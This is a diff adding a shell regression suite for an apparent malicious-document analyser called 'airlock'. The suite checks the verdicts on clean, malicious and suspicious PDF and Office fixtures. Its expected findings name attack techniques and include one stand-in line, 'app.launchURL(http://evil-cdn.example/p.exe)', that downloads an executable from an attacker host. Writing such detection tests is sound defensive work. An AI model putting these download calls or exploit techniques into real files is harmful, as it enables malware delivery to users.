@@ -1,0 +1,63 @@
+#!/bin/sh
+# Regression suite: every sample must get exactly its expected verdict, and
+# key findings must be present. Test files come from tests/fetch-fixtures.sh
+# (generated PDFs + benign oletools fixtures); nothing personal is needed.
+set -u
+cd "$(dirname "$0")/.."
+AIRLOCK=./host/target/release/airlock
+OUT=build/tests
+rm -rf "$OUT" && mkdir -p "$OUT"
+fail=0
+
+check() { # file, expected verdict, [required substring...]
+    f=$1; want=$2; shift 2
+    name=$(basename "$f")
+    if ! $AIRLOCK analyze "$f" --out "$OUT/$name" >"$OUT/$name.log" 2>&1; then
+        echo "FAIL $name: airlock exited non-zero (see $OUT/$name.log)"; fail=$((fail+1)); return
+    fi
+    got=$(python3 -I -c 'import json,sys; print(json.load(open(sys.argv[1]))["verdict"])' "$OUT/$name/report.json")
+    if [ "$got" != "$want" ]; then
+        echo "FAIL $name: verdict '$got', expected '$want'"; fail=$((fail+1)); return
+    fi
+    for need in "$@"; do
+        if ! grep -qF -- "$need" "$OUT/$name/report.json"; then
+            echo "FAIL $name: missing finding '$need'"; fail=$((fail+1)); return
+        fi
+    done
+    [ -f "$OUT/$name/safe.pdf" ] || { echo "FAIL $name: no safe.pdf"; fail=$((fail+1)); return; }
+    echo "ok   $name -> $got"
+}
+
+NONE="NO ACTIVE BEHAVIOUR OBSERVED"
+check testdata/clean.pdf "$NONE"
+check testdata/text.pdf "$NONE"
+check testdata/evil.pdf "MALICIOUS BEHAVIOUR" "app.launchURL(http://evil-cdn.example/p.exe)" "hex-escaped names"
+check testdata/evil2.pdf "MALICIOUS BEHAVIOUR" "CVE-2008-2992" "shellcode pattern" "heap spray" "nLaunch=2" "gate.php"
+check testdata/office/harmless-clean.docx "$NONE"
+check testdata/office/harmless-clean.doc "$NONE"
+check testdata/office/follina-template.docx "LIKELY MALICIOUS" "CVE-2022-30190" "remote template injection"
+check testdata/office/dde-test.docx "LIKELY MALICIOUS" "DDE field runs a command"
+check testdata/office/excel4_sample_macro.xls "SUSPICIOUS" "Excel 4.0 (XLM)"
+check testdata/office/embedded-simple-2007.docx "SUSPICIOUS" "oleObject1.bin"
+check testdata/office/sample_with_external_link_to_doc.docx "SUSPICIOUS" "externally linked OLE object"
+check testdata/office/sample_with_vba.ppt "SUSPICIOUS" "Action_Click"
+
+if $AIRLOCK view testdata/office/harmless-clean.docx --out "$OUT/view-docx" >"$OUT/view-docx.log" 2>&1 && [ -f "$OUT/view-docx/safe.pdf" ]; then
+    echo "ok   view mode (docx, no network)"
+else
+    echo "FAIL view mode docx"; fail=$((fail+1))
+fi
+for f in testdata/text.pdf testdata/office/harmless-clean.docx; do
+    if $AIRLOCK livecheck "$f" >"$OUT/live-$(basename "$f").log" 2>&1 && grep -q "hit(s)" "$OUT/live-$(basename "$f").log"; then
+        echo "ok   live mode $(basename "$f") ($(grep -o 'ready in [0-9.]*s' "$OUT/live-$(basename "$f").log"))"
+    else
+        echo "FAIL live mode $(basename "$f")"; fail=$((fail+1))
+    fi
+done
+if $AIRLOCK selftest --out "$OUT/selftest" >"$OUT/selftest.log" 2>&1; then
+    echo "ok   selftest ($(grep -c PASS "$OUT/selftest.log") detectors)"
+else
+    echo "FAIL selftest (see $OUT/selftest.log)"; fail=$((fail+1))
+fi
+
+[ $fail -eq 0 ] && echo "ALL PASSED" || { echo "$fail FAILED"; exit 1; }
